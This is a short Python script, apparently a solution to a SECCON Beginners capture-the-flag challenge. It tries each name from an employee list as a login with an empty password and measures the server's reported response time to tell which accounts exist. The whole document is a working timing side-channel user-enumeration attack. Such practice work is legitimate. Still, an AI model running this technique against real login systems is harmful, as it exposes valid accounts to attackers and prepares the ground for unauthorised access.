import requests

with open("employees.txt-c8eb600b89a185e33b6ad279b5f3b513d41b7302", "r") as f:
    employees = map(lambda x: x.strip(), f.readlines())

url = "https://spy.quals.beginners.seccon.jp/"
db_users = []
with requests.session() as s:
    for employee in employees:
        print(employee)
        r = s.post(url, data={"name": employee, "password": ""})

        idx = r.text.rfind("It took") + 8
        login_time = float(r.text[idx: idx + 9])
        if login_time > 0.01:
            db_users.append(employee)
print(db_users)
